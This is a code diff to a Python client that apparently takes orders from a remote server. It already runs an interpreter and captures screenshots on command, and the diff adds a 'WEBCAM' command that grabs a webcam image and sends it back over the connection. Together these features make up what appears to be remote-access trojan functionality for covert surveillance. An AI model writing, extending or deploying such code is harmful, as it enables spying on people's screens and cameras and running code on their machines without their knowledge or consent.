@@ -9,6 +9,7 @@ from cryptography import x509
 
 from utils.baseclient import BaseClient
 from modules import screen
+from modules import webcam
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -30,6 +31,8 @@ class Client(BaseClient):
                 self.interpreter()
             case 'SCREENSHOT':
                 self.screenshot()
+            case 'WEBCAM':
+                self.webcam()
             case _:
                 logging.debug('Received unrecognized command: %s' % command)
 
@@ -58,7 +61,7 @@ class Client(BaseClient):
             sys.stdout = old_stdout
         self.write((output.getvalue() + error_message).encode())
 
-    def screenshot(self):
+    def screenshot(self) -> None:
         """ Take a screenshot """
         logging.debug('Capturing screenshot')
         try:
@@ -71,6 +74,17 @@ class Client(BaseClient):
             logging.info('Successfully captured screenshot')
         self.write(data)
 
+    def webcam(self) -> None:
+        """ Capture webcam """
+        logging.debug('Capturing webcam')
+        try:
+            img_data = webcam.capture_webcam()
+        except RuntimeError:
+            logging.error('Could not capture webcam')
+            img_data = b'ERROR'
+        else:
+            logging.info('Captured webcam')
+        self.write(img_data)
 
 if __name__ == '__main__':
 
